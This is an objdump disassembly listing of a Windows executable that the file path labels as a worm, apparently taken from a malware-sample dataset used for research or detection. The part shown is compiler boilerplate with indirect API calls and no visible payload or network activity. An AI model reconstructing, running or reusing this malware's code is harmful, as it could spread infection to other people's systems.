
malware_samples/worm/5af6ac5ec9dd8ca20cf7cd75ee65645c41a04b744bfd597c9c914e465a30d729.exe:     file format pei-i386


Disassembly of section B:

00401000 <B>:
  401000:	6a ff                	push   $0xffffffff
  401002:	68 1a 06 42 00       	push   $0x42061a
  401007:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40100d:	50                   	push   %eax
  40100e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401015:	51                   	push   %ecx
  401016:	68 bc 00 00 00       	push   $0xbc
  40101b:	e8 3c f6 00 00       	call   0x41065c
  401020:	83 c4 04             	add    $0x4,%esp
  401023:	89 44 24 00          	mov    %eax,0x0(%esp)
  401027:	85 c0                	test   %eax,%eax
  401029:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  401030:	00 
  401031:	74 16                	je     0x401049
  401033:	8b c8                	mov    %eax,%ecx
  401035:	e8 46 00 00 00       	call   0x401080
  40103a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40103e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401045:	83 c4 10             	add    $0x10,%esp
  401048:	c3                   	ret
  401049:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40104d:	33 c0                	xor    %eax,%eax
  40104f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401056:	83 c4 10             	add    $0x10,%esp
  401059:	c3                   	ret
  40105a:	90                   	nop
  40105b:	90                   	nop
  40105c:	90                   	nop
  40105d:	90                   	nop
  40105e:	90                   	nop
  40105f:	90                   	nop
  401060:	b8 00 20 42 00       	mov    $0x422000,%eax
  401065:	c3                   	ret
  401066:	90                   	nop
  401067:	90                   	nop
  401068:	90                   	nop
  401069:	90                   	nop
  40106a:	90                   	nop
  40106b:	90                   	nop
  40106c:	90                   	nop
  40106d:	90                   	nop
  40106e:	90                   	nop
  40106f:	90                   	nop
  401070:	b8 18 20 42 00       	mov    $0x422018,%eax
  401075:	c3                   	ret
  401076:	90                   	nop
  401077:	90                   	nop
  401078:	90                   	nop
  401079:	90                   	nop
  40107a:	90                   	nop
  40107b:	90                   	nop
  40107c:	90                   	nop
  40107d:	90                   	nop
  40107e:	90                   	nop
  40107f:	90                   	nop
  401080:	56                   	push   %esi
  401081:	8b f1                	mov    %ecx,%esi
  401083:	e8 58 aa 01 00       	call   0x41bae0
  401088:	c7 06 70 21 42 00    	movl   $0x422170,(%esi)
  40108e:	8b c6                	mov    %esi,%eax
  401090:	5e                   	pop    %esi
  401091:	c3                   	ret
  401092:	90                   	nop
  401093:	90                   	nop
  401094:	90                   	nop
  401095:	90                   	nop
  401096:	90                   	nop
  401097:	90                   	nop
  401098:	90                   	nop
  401099:	90                   	nop
  40109a:	90                   	nop
  40109b:	90                   	nop
  40109c:	90                   	nop
  40109d:	90                   	nop
  40109e:	90                   	nop
  40109f:	90                   	nop
  4010a0:	56                   	push   %esi
  4010a1:	8b f1                	mov    %ecx,%esi
  4010a3:	e8 18 00 00 00       	call   0x4010c0
  4010a8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  4010ad:	74 09                	je     0x4010b8
  4010af:	56                   	push   %esi
  4010b0:	e8 e3 f5 00 00       	call   0x410698
  4010b5:	83 c4 04             	add    $0x4,%esp
  4010b8:	8b c6                	mov    %esi,%eax
  4010ba:	5e                   	pop    %esi
  4010bb:	c2 04 00             	ret    $0x4
  4010be:	90                   	nop
  4010bf:	90                   	nop
  4010c0:	c7 01 70 21 42 00    	movl   $0x422170,(%ecx)
  4010c6:	e9 f7 aa 01 00       	jmp    0x41bbc2
  4010cb:	90                   	nop
  4010cc:	90                   	nop
  4010cd:	90                   	nop
  4010ce:	90                   	nop
  4010cf:	90                   	nop
  4010d0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4010d4:	50                   	push   %eax
  4010d5:	e8 dd b1 01 00       	call   0x41c2b7
  4010da:	f7 d8                	neg    %eax
  4010dc:	1b c0                	sbb    %eax,%eax
  4010de:	f7 d8                	neg    %eax
  4010e0:	c2 04 00             	ret    $0x4
  4010e3:	90                   	nop
  4010e4:	90                   	nop
  4010e5:	90                   	nop
  4010e6:	90                   	nop
  4010e7:	90                   	nop
  4010e8:	90                   	nop
  4010e9:	90                   	nop
  4010ea:	90                   	nop
  4010eb:	90                   	nop
  4010ec:	90                   	nop
  4010ed:	90                   	nop
  4010ee:	90                   	nop
  4010ef:	90                   	nop
  4010f0:	83 ec 24             	sub    $0x24,%esp
  4010f3:	b8 0a 00 00 00       	mov    $0xa,%eax
  4010f8:	8b 15 b0 90 42 00    	mov    0x4290b0,%edx
  4010fe:	89 44 24 00          	mov    %eax,0x0(%esp)
  401102:	89 44 24 04          	mov    %eax,0x4(%esp)
  401106:	b8 c8 00 00 00       	mov    $0xc8,%eax
  40110b:	89 54 24 14          	mov    %edx,0x14(%esp)
  40110f:	89 44 24 08          	mov    %eax,0x8(%esp)
  401113:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401117:	a1 ac 90 42 00       	mov    0x4290ac,%eax
  40111c:	8b 15 b8 90 42 00    	mov    0x4290b8,%edx
  401122:	89 44 24 10          	mov    %eax,0x10(%esp)
  401126:	a1 b4 90 42 00       	mov    0x4290b4,%eax
  40112b:	89 44 24 18          	mov    %eax,0x18(%esp)
  40112f:	66 a1 bc 90 42 00    	mov    0x4290bc,%ax
  401135:	66 89 44 24 20       	mov    %ax,0x20(%esp)
  40113a:	8b 41 1c             	mov    0x1c(%ecx),%eax
  40113d:	56                   	push   %esi
  40113e:	89 54 24 20          	mov    %edx,0x20(%esp)
  401142:	8a 15 be 90 42 00    	mov    0x4290be,%dl
  401148:	57                   	push   %edi
  401149:	50                   	push   %eax
  40114a:	88 54 24 2e          	mov    %dl,0x2e(%esp)
  40114e:	ff 15 b0 1a 43 00    	call   *0x431ab0
  401154:	50                   	push   %eax
  401155:	e8 6e 66 01 00       	call   0x4177c8
  40115a:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40115e:	8b f0                	mov    %eax,%esi
  401160:	6a 01                	push   $0x1
  401162:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  401166:	8b 3e                	mov    (%esi),%edi
  401168:	51                   	push   %ecx
  401169:	52                   	push   %edx
  40116a:	ff 15 10 18 43 00    	call   *0x431810
  401170:	50                   	push   %eax
  401171:	8d 44 24 24          	lea    0x24(%esp),%eax
  401175:	50                   	push   %eax
  401176:	8b ce                	mov    %esi,%ecx
  401178:	ff 57 70             	call   *0x70(%edi)
  40117b:	5f                   	pop    %edi
  40117c:	5e                   	pop    %esi
  40117d:	83 c4 24             	add    $0x24,%esp
  401180:	c3                   	ret
  401181:	90                   	nop
  401182:	90                   	nop
  401183:	90                   	nop
  401184:	90                   	nop
  401185:	90                   	nop
  401186:	90                   	nop
  401187:	90                   	nop
  401188:	90                   	nop
  401189:	90                   	nop
  40118a:	90                   	nop
  40118b:	90                   	nop
  40118c:	90                   	nop
  40118d:	90                   	nop
  40118e:	90                   	nop
  40118f:	90                   	nop
  401190:	83 ec 28             	sub    $0x28,%esp
  401193:	56                   	push   %esi
  401194:	8b c1                	mov    %ecx,%eax
  401196:	57                   	push   %edi
  401197:	b9 05 00 00 00       	mov    $0x5,%ecx
  40119c:	be c0 90 42 00       	mov    $0x4290c0,%esi
  4011a1:	8d 7c 24 18          	lea    0x18(%esp),%edi
  4011a5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4011a7:	8b 40 1c             	mov    0x1c(%eax),%eax
  4011aa:	b9 0a 00 00 00       	mov    $0xa,%ecx
  4011af:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  4011b3:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  4011b7:	b9 c8 00 00 00       	mov    $0xc8,%ecx
  4011bc:	50                   	push   %eax
  4011bd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4011be:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  4011c2:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4011c6:	ff 15 b0 1a 43 00    	call   *0x431ab0
  4011cc:	50                   	push   %eax
  4011cd:	e8 f6 65 01 00       	call   0x4177c8
  4011d2:	8b 70 04             	mov    0x4(%eax),%esi
  4011d5:	6a 00                	push   $0x0
  4011d7:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4011db:	6a 01                	push   $0x1
  4011dd:	8d 54 24 20          	lea    0x20(%esp),%edx
  4011e1:	51                   	push   %ecx
  4011e2:	52                   	push   %edx
  4011e3:	ff 15 10 18 43 00    	call   *0x431810
  4011e9:	50                   	push   %eax
  4011ea:	8d 44 24 28          	lea    0x28(%esp),%eax
  4011ee:	50                   	push   %eax
  4011ef:	56                   	push   %esi
  4011f0:	ff 15 ac 1a 43 00    	call   *0x431aac
  4011f6:	5f                   	pop    %edi
  4011f7:	5e                   	pop    %esi
  4011f8:	83 c4 28             	add    $0x28,%esp
  4011fb:	c3                   	ret
  4011fc:	90                   	nop
  4011fd:	90                   	nop
  4011fe:	90                   	nop
  4011ff:	90                   	nop
  401200:	83 ec 28             	sub    $0x28,%esp
  401203:	8b c1                	mov    %ecx,%eax
  401205:	56                   	push   %esi
  401206:	b9 0a 00 00 00       	mov    $0xa,%ecx
  40120b:	57                   	push   %edi
  40120c:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  401210:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  401214:	b9 c8 00 00 00       	mov    $0xc8,%ecx
  401219:	be d8 90 42 00       	mov    $0x4290d8,%esi
  40121e:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  401222:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  401226:	b9 05 00 00 00       	mov    $0x5,%ecx
  40122b:	8d 7c 24 18          	lea    0x18(%esp),%edi
  40122f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401231:	8b 40 1c             	mov    0x1c(%eax),%eax
  401234:	50                   	push   %eax
  401235:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401236:	ff 15 b0 1a 43 00    	call   *0x431ab0
  40123c:	50                   	push   %eax
  40123d:	e8 86 65 01 00       	call   0x4177c8
  401242:	8b f0                	mov    %eax,%esi
  401244:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  401248:	6a 00                	push   $0x0
  40124a:	51                   	push   %ecx
  40124b:	8b 3e                	mov    (%esi),%edi
  40124d:	ff 15 10 18 43 00    	call   *0x431810
  401253:	50                   	push   %eax
  401254:	8d 54 24 20          	lea    0x20(%esp),%edx
  401258:	8d 44 24 10          	lea    0x10(%esp),%eax
  40125c:	52                   	push   %edx
  40125d:	50                   	push   %eax
  40125e:	6a 04                	push   $0x4
  401260:	6a 1e                	push   $0x1e
  401262:	6a 1e                	push   $0x1e
  401264:	8b ce                	mov    %esi,%ecx
  401266:	ff 57 68             	call   *0x68(%edi)
  401269:	5f                   	pop    %edi
  40126a:	5e                   	pop    %esi
  40126b:	83 c4 28             	add    $0x28,%esp
  40126e:	c3                   	ret
  40126f:	90                   	nop
  401270:	83 ec 24             	sub    $0x24,%esp
  401273:	56                   	push   %esi
  401274:	8b c1                	mov    %ecx,%eax
  401276:	57                   	push   %edi
  401277:	b9 07 00 00 00       	mov    $0x7,%ecx
  40127c:	be f0 90 42 00       	mov    $0x4290f0,%esi
  401281:	8d 7c 24 0c          	lea    0xc(%esp),%edi
  401285:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401287:	8b 40 1c             	mov    0x1c(%eax),%eax
  40128a:	c7 44 24 08 0a 00 00 	movl   $0xa,0x8(%esp)
  401291:	00 
  401292:	50                   	push   %eax
  401293:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  401295:	ff 15 b0 1a 43 00    	call   *0x431ab0
  40129b:	50                   	push   %eax
  40129c:	e8 27 65 01 00       	call   0x4177c8
  4012a1:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4012a5:	8b f0                	mov    %eax,%esi
  4012a7:	51                   	push   %ecx
  4012a8:	ff 15 10 18 43 00    	call   *0x431810
  4012ae:	8b 4e 08             	mov    0x8(%esi),%ecx
  4012b1:	8d 54 24 08          	lea    0x8(%esp),%edx
  4012b5:	52                   	push   %edx
  4012b6:	6a 01                	push   $0x1
  4012b8:	50                   	push   %eax
  4012b9:	8d 44 24 18          	lea    0x18(%esp),%eax
  4012bd:	50                   	push   %eax
  4012be:	51                   	push   %ecx
  4012bf:	ff 15 78 1a 43 00    	call   *0x431a78
  4012c5:	5f                   	pop    %edi
  4012c6:	5e                   	pop    %esi
  4012c7:	83 c4 24             	add    $0x24,%esp
  4012ca:	c3                   	ret
  4012cb:	90                   	nop
  4012cc:	90                   	nop
  4012cd:	90                   	nop
  4012ce:	90                   	nop
  4012cf:	90                   	nop
  4012d0:	83 ec 2c             	sub    $0x2c,%esp
  4012d3:	56                   	push   %esi
  4012d4:	8b c1                	mov    %ecx,%eax
  4012d6:	57                   	push   %edi
  4012d7:	b9 07 00 00 00       	mov    $0x7,%ecx
  4012dc:	be 10 91 42 00       	mov    $0x429110,%esi
  4012e1:	8d 7c 24 14          	lea    0x14(%esp),%edi
  4012e5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4012e7:	8b 40 1c             	mov    0x1c(%eax),%eax
  4012ea:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4012f1:	00 
  4012f2:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  4012f4:	50                   	push   %eax
  4012f5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4012f6:	ff 15 b0 1a 43 00    	call   *0x431ab0
  4012fc:	50                   	push   %eax
  4012fd:	e8 c6 64 01 00       	call   0x4177c8
  401302:	8b 70 04             	mov    0x4(%eax),%esi
  401305:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  401309:	51                   	push   %ecx
  40130a:	8d 54 24 0c          	lea    0xc(%esp),%edx
  40130e:	6a 00                	push   $0x0
  401310:	52                   	push   %edx
  401311:	8d 44 24 20          	lea    0x20(%esp),%eax
  401315:	68 e8 03 00 00       	push   $0x3e8
  40131a:	50                   	push   %eax
  40131b:	ff 15 10 18 43 00    	call   *0x431810
  401321:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  401325:	50                   	push   %eax
  401326:	51                   	push   %ecx
  401327:	56                   	push   %esi
  401328:	ff 15 60 16 43 00    	call   *0x431660
  40132e:	5f                   	pop    %edi
  40132f:	5e                   	pop    %esi
  401330:	83 c4 2c             	add    $0x2c,%esp
  401333:	c3                   	ret
  401334:	90                   	nop
  401335:	90                   	nop
  401336:	90                   	nop
  401337:	90                   	nop
  401338:	90                   	nop
  401339:	90                   	nop
  40133a:	90                   	nop
  40133b:	90                   	nop
  40133c:	90                   	nop
  40133d:	90                   	nop
  40133e:	90                   	nop
  40133f:	90                   	nop
  401340:	83 ec 28             	sub    $0x28,%esp
  401343:	8b c1                	mov    %ecx,%eax
  401345:	b9 07 00 00 00       	mov    $0x7,%ecx
  40134a:	56                   	push   %esi
  40134b:	57                   	push   %edi
  40134c:	be 10 91 42 00       	mov    $0x429110,%esi
  401351:	8d 7c 24 10          	lea    0x10(%esp),%edi
  401355:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401357:	8b 40 1c             	mov    0x1c(%eax),%eax
  40135a:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  40135c:	50                   	push   %eax
  40135d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40135e:	ff 15 b0 1a 43 00    	call   *0x431ab0
  401364:	50                   	push   %eax
  401365:	e8 5e 64 01 00       	call   0x4177c8
  40136a:	8b 70 04             	mov    0x4(%eax),%esi
  40136d:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401371:	8d 54 24 10          	lea    0x10(%esp),%edx
  401375:	51                   	push   %ecx
  401376:	52                   	push   %edx
  401377:	ff 15 10 18 43 00    	call   *0x431810
  40137d:	50                   	push   %eax
  40137e:	8d 44 24 18          	lea    0x18(%esp),%eax
  401382:	50                   	push   %eax
  401383:	56                   	push   %esi
  401384:	ff 15 28 16 43 00    	call   *0x431628
  40138a:	5f                   	pop    %edi
  40138b:	5e                   	pop    %esi
  40138c:	83 c4 28             	add    $0x28,%esp
  40138f:	c3                   	ret
  401390:	83 ec 28             	sub    $0x28,%esp
  401393:	8b c1                	mov    %ecx,%eax
  401395:	b9 07 00 00 00       	mov    $0x7,%ecx
  40139a:	56                   	push   %esi
  40139b:	57                   	push   %edi
  40139c:	be 30 91 42 00       	mov    $0x429130,%esi
  4013a1:	8d 7c 24 10          	lea    0x10(%esp),%edi
  4013a5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4013a7:	8b 40 1c             	mov    0x1c(%eax),%eax
  4013aa:	50                   	push   %eax
  4013ab:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4013ac:	ff 15 b0 1a 43 00    	call   *0x431ab0
  4013b2:	50                   	push   %eax
  4013b3:	e8 10 64 01 00       	call   0x4177c8
  4013b8:	8b 70 04             	mov    0x4(%eax),%esi
  4013bb:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4013bf:	8d 54 24 10          	lea    0x10(%esp),%edx
  4013c3:	51                   	push   %ecx
  4013c4:	52                   	push   %edx
  4013c5:	ff 15 10 18 43 00    	call   *0x431810
  4013cb:	50                   	push   %eax
  4013cc:	8d 44 24 18          	lea    0x18(%esp),%eax
  4013d0:	50                   	push   %eax
  4013d1:	56                   	push   %esi
  4013d2:	ff 15 ac 16 43 00    	call   *0x4316ac
  4013d8:	5f                   	pop    %edi
  4013d9:	5e                   	pop    %esi
  4013da:	83 c4 28             	add    $0x28,%esp
  4013dd:	c3                   	ret
  4013de:	90                   	nop
  4013df:	90                   	nop
  4013e0:	6a 00                	push   $0x0
  4013e2:	68 6c 91 42 00       	push   $0x42916c
  4013e7:	68 50 91 42 00       	push   $0x429150
  4013ec:	e8 2d 96 01 00       	call   0x41aa1e
  4013f1:	c3                   	ret
  4013f2:	90                   	nop
  4013f3:	90                   	nop
  4013f4:	90                   	nop
  4013f5:	90                   	nop
  4013f6:	90                   	nop
  4013f7:	90                   	nop
  4013f8:	90                   	nop
  4013f9:	90                   	nop
  4013fa:	90                   	nop
  4013fb:	90                   	nop
  4013fc:	90                   	nop
  4013fd:	90                   	nop
  4013fe:	90                   	nop
  4013ff:	90                   	nop
  401400:	83 ec 24             	sub    $0x24,%esp
  401403:	8b c1                	mov    %ecx,%eax
  401405:	56                   	push   %esi
  401406:	57                   	push   %edi
  401407:	b9 06 00 00 00       	mov    $0x6,%ecx
  40140c:	8b 40 1c             	mov    0x1c(%eax),%eax
  40140f:	be 74 91 42 00       	mov    $0x429174,%esi
  401414:	8d 7c 24 14          	lea    0x14(%esp),%edi
  401418:	50                   	push   %eax
  401419:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40141b:	c7 44 24 0c 0a 00 00 	movl   $0xa,0xc(%esp)
  401422:	00 
  401423:	ff 15 b0 1a 43 00    	call   *0x431ab0
  401429:	50                   	push   %eax
  40142a:	e8 99 63 01 00       	call   0x4177c8
  40142f:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401433:	6a 0a                	push   $0xa
  401435:	8b f0                	mov    %eax,%esi
  401437:	51                   	push   %ecx
  401438:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  40143c:	6a 01                	push   $0x1
  40143e:	8b 3e                	mov    (%esi),%edi
  401440:	52                   	push   %edx
  401441:	ff 15 10 18 43 00    	call   *0x431810
  401447:	50                   	push   %eax
  401448:	8d 44 24 24          	lea    0x24(%esp),%eax
  40144c:	50                   	push   %eax
  40144d:	6a 0a                	push   $0xa
  40144f:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  401453:	6a 0a                	push   $0xa
  401455:	51                   	push   %ecx
  401456:	8b ce                	mov    %esi,%ecx
  401458:	ff 57 6c             	call   *0x6c(%edi)
  40145b:	5f                   	pop    %edi
  40145c:	5e                   	pop    %esi
  40145d:	83 c4 24             	add    $0x24,%esp
  401460:	c3                   	ret
  401461:	90                   	nop
  401462:	90                   	nop
  401463:	90                   	nop
  401464:	90                   	nop
  401465:	90                   	nop
  401466:	90                   	nop
  401467:	90                   	nop
  401468:	90                   	nop
  401469:	90                   	nop
  40146a:	90                   	nop
  40146b:	90                   	nop
  40146c:	90                   	nop
  40146d:	90                   	nop
  40146e:	90                   	nop
  40146f:	90                   	nop
  401470:	83 ec 14             	sub    $0x14,%esp
  401473:	a1 8c 91 42 00       	mov    0x42918c,%eax
  401478:	8b 15 90 91 42 00    	mov    0x429190,%edx
  40147e:	8b 49 1c             	mov    0x1c(%ecx),%ecx
  401481:	89 44 24 00          	mov    %eax,0x0(%esp)
  401485:	a1 94 91 42 00       	mov    0x429194,%eax
  40148a:	56                   	push   %esi
  40148b:	89 54 24 08          	mov    %edx,0x8(%esp)
  40148f:	8b 15 98 91 42 00    	mov    0x429198,%edx
  401495:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401499:	66 a1 9c 91 42 00    	mov    0x42919c,%ax
  40149f:	57                   	push   %edi
  4014a0:	51                   	push   %ecx
  4014a1:	89 54 24 18          	mov    %edx,0x18(%esp)
  4014a5:	66 89 44 24 1c       	mov    %ax,0x1c(%esp)
  4014aa:	ff 15 b0 1a 43 00    	call   *0x431ab0
  4014b0:	50                   	push   %eax
  4014b1:	e8 12 63 01 00       	call   0x4177c8
  4014b6:	8b f0                	mov    %eax,%esi
  4014b8:	8d 54 24 08          	lea    0x8(%esp),%edx
  4014bc:	52                   	push   %edx
  4014bd:	8b 3e                	mov    (%esi),%edi
  4014bf:	ff 15 10 18 43 00    	call   *0x431810
  4014c5:	50                   	push   %eax
  4014c6:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4014ca:	50                   	push   %eax
  4014cb:	6a 0a                	push   $0xa
  4014cd:	6a 0a                	push   $0xa
  4014cf:	8b ce                	mov    %esi,%ecx
  4014d1:	ff 57 64             	call   *0x64(%edi)
  4014d4:	5f                   	pop    %edi
  4014d5:	5e                   	pop    %esi
  4014d6:	83 c4 14             	add    $0x14,%esp
  4014d9:	c3                   	ret
  4014da:	90                   	nop
  4014db:	90                   	nop
  4014dc:	90                   	nop
  4014dd:	90                   	nop
  4014de:	90                   	nop
  4014df:	90                   	nop
  4014e0:	6a 00                	push   $0x0
  4014e2:	6a 01                	push   $0x1
  4014e4:	68 a0 91 42 00       	push   $0x4291a0
  4014e9:	6a 00                	push   $0x0
  4014eb:	ff 15 74 1a 43 00    	call   *0x431a74
  4014f1:	c3                   	ret
  4014f2:	90                   	nop
  4014f3:	90                   	nop
  4014f4:	90                   	nop
  4014f5:	90                   	nop
  4014f6:	90                   	nop
  4014f7:	90                   	nop
  4014f8:	90                   	nop
  4014f9:	90                   	nop
  4014fa:	90                   	nop
  4014fb:	90                   	nop
  4014fc:	90                   	nop
  4014fd:	90                   	nop
  4014fe:	90                   	nop
  4014ff:	90                   	nop
  401500:	81 ec 00 02 00 00    	sub    $0x200,%esp
  401506:	8d 44 24 00          	lea    0x0(%esp),%eax
  40150a:	56                   	push   %esi
  40150b:	68 c4 91 42 00       	push   $0x4291c4
  401510:	68 b8 91 42 00       	push   $0x4291b8
  401515:	8b f1                	mov    %ecx,%esi
  401517:	50                   	push   %eax
  401518:	ff 15 70 1a 43 00    	call   *0x431a70
  40151e:	83 c4 0c             	add    $0xc,%esp
  401521:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401525:	6a 00                	push   $0x0
  401527:	68 ac 91 42 00       	push   $0x4291ac
  40152c:	51                   	push   %ecx
  40152d:	8b ce                	mov    %esi,%ecx
  40152f:	e8 ea 94 01 00       	call   0x41aa1e
  401534:	5e                   	pop    %esi
  401535:	81 c4 00 02 00 00    	add    $0x200,%esp
  40153b:	c3                   	ret
  40153c:	90                   	nop
  40153d:	90                   	nop
  40153e:	90                   	nop
  40153f:	90                   	nop
  401540:	81 ec 0c 02 00 00    	sub    $0x20c,%esp
  401546:	a1 b8 91 42 00       	mov    0x4291b8,%eax
  40154b:	8a 15 c0 91 42 00    	mov    0x4291c0,%dl
  401551:	56                   	push   %esi
  401552:	8b f1                	mov    %ecx,%esi
  401554:	8b 0d bc 91 42 00    	mov    0x4291bc,%ecx
  40155a:	89 44 24 04          	mov    %eax,0x4(%esp)
  40155e:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  401562:	8d 44 24 04          	lea    0x4(%esp),%eax
  401566:	68 d8 91 42 00       	push   $0x4291d8
  40156b:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40156f:	50                   	push   %eax
  401570:	51                   	push   %ecx
  401571:	88 54 24 18          	mov    %dl,0x18(%esp)
  401575:	e8 26 00 00 00       	call   0x4015a0
  40157a:	83 c4 0c             	add    $0xc,%esp
  40157d:	8d 54 24 10          	lea    0x10(%esp),%edx
  401581:	8b ce                	mov    %esi,%ecx
  401583:	6a 00                	push   $0x0
  401585:	68 ac 91 42 00       	push   $0x4291ac
  40158a:	52                   	push   %edx
  40158b:	e8 8e 94 01 00       	call   0x41aa1e
  401590:	5e                   	pop    %esi
  401591:	81 c4 0c 02 00 00    	add    $0x20c,%esp
  401597:	c3                   	ret
  401598:	90                   	nop
  401599:	90                   	nop
  40159a:	90                   	nop
  40159b:	90                   	nop
  40159c:	90                   	nop
  40159d:	90                   	nop
  40159e:	90                   	nop
  40159f:	90                   	nop
  4015a0:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4015a4:	8b 54 24 04          	mov    0x4(%esp),%edx
  4015a8:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4015ac:	50                   	push   %eax
  4015ad:	51                   	push   %ecx
  4015ae:	52                   	push   %edx
  4015af:	ff 15 6c 1a 43 00    	call   *0x431a6c
  4015b5:	c3                   	ret
  4015b6:	90                   	nop
  4015b7:	90                   	nop
  4015b8:	90                   	nop
  4015b9:	90                   	nop
  4015ba:	90                   	nop
  4015bb:	90                   	nop
  4015bc:	90                   	nop
  4015bd:	90                   	nop
  4015be:	90                   	nop
  4015bf:	90                   	nop
  4015c0:	c2 04 00             	ret    $0x4
  4015c3:	90                   	nop
  4015c4:	90                   	nop
  4015c5:	90                   	nop
  4015c6:	90                   	nop
  4015c7:	90                   	nop
  4015c8:	90                   	nop
  4015c9:	90                   	nop
  4015ca:	90                   	nop
  4015cb:	90                   	nop
  4015cc:	90                   	nop
  4015cd:	90                   	nop
  4015ce:	90                   	nop
  4015cf:	90                   	nop
  4015d0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4015d4:	50                   	push   %eax
  4015d5:	e8 be f0 00 00       	call   0x410698
  4015da:	83 c4 04             	add    $0x4,%esp
  4015dd:	c2 04 00             	ret    $0x4
  4015e0:	c3                   	ret
  4015e1:	90                   	nop
  4015e2:	90                   	nop
  4015e3:	90                   	nop
  4015e4:	90                   	nop
  4015e5:	90                   	nop
  4015e6:	90                   	nop
  4015e7:	90                   	nop
  4015e8:	90                   	nop
  4015e9:	90                   	nop
  4015ea:	90                   	nop
  4015eb:	90                   	nop
  4015ec:	90                   	nop
  4015ed:	90                   	nop
  4015ee:	90                   	nop
  4015ef:	90                   	nop
  4015f0:	b8 70 22 42 00       	mov    $0x422270,%eax
  4015f5:	c3                   	ret
  4015f6:	90                   	nop
  4015f7:	90                   	nop
  4015f8:	90                   	nop
  4015f9:	90                   	nop
  4015fa:	90                   	nop
  4015fb:	90                   	nop
  4015fc:	90                   	nop
  4015fd:	90                   	nop
  4015fe:	90                   	nop
  4015ff:	90                   	nop
  401600:	56                   	push   %esi
  401601:	8b f1                	mov    %ecx,%esi
  401603:	6a 00                	push   $0x0
  401605:	e8 00 c9 01 00       	call   0x41df0a
  40160a:	c7 06 f8 22 42 00    	movl   $0x4222f8,(%esi)
  401610:	8b c6                	mov    %esi,%eax
  401612:	5e                   	pop    %esi
  401613:	c3                   	ret
  401614:	90                   	nop
  401615:	90                   	nop
  401616:	90                   	nop
  401617:	90                   	nop
  401618:	90                   	nop
  401619:	90                   	nop
  40161a:	90                   	nop
  40161b:	90                   	nop
  40161c:	90                   	nop
  40161d:	90                   	nop
  40161e:	90                   	nop
  40161f:	90                   	nop
  401620:	56                   	push   %esi
  401621:	8b f1                	mov    %ecx,%esi
  401623:	e8 18 00 00 00       	call   0x401640
  401628:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40162d:	74 09                	je     0x401638
  40162f:	56                   	push   %esi
  401630:	e8 63 f0 00 00       	call   0x410698
  401635:	83 c4 04             	add    $0x4,%esp
  401638:	8b c6                	mov    %esi,%eax
  40163a:	5e                   	pop    %esi
  40163b:	c2 04 00             	ret    $0x4
  40163e:	90                   	nop
  40163f:	90                   	nop
  401640:	e9 37 cd 01 00       	jmp    0x41e37c
  401645:	90                   	nop
  401646:	90                   	nop
  401647:	90                   	nop
  401648:	90                   	nop
  401649:	90                   	nop
  40164a:	90                   	nop
  40164b:	90                   	nop
  40164c:	90                   	nop
  40164d:	90                   	nop
  40164e:	90                   	nop
  40164f:	90                   	nop
  401650:	e8 0b 00 00 00       	call   0x401660
  401655:	e9 16 00 00 00       	jmp    0x401670
  40165a:	90                   	nop
  40165b:	90                   	nop
  40165c:	90                   	nop
  40165d:	90                   	nop
  40165e:	90                   	nop
  40165f:	90                   	nop
  401660:	b9 60 ce 42 00       	mov    $0x42ce60,%ecx
  401665:	e9 96 ff ff ff       	jmp    0x401600
  40166a:	90                   	nop
  40166b:	90                   	nop
  40166c:	90                   	nop
  40166d:	90                   	nop
  40166e:	90                   	nop
  40166f:	90                   	nop
  401670:	68 80 16 40 00       	push   $0x401680
  401675:	e8 e6 0f 00 00       	call   0x402660
